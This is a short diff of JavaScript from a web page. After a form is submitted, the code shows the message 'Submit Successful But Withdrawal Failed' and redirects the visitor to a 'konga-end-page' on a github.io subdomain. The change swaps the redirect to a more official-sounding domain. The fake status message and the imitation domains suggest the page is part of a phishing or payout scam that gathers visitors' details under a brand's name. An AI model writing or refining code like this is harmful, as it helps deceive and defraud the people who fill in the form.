@@ -39,7 +39,7 @@ window.onload = function() {
             let Subscribe = setTimeout(sub, 2800);
             function sub(){
                 subscribe.value = 'Submit Successful But Withdrawal Failed'
-                 window.location.href="https://application-online.github.io/konga-end-page/"
+                 window.location.href="https://official-online-application.github.io/konga-end-page/"
             }
         }, function(error) {
                 console.log('FAILED...', error);
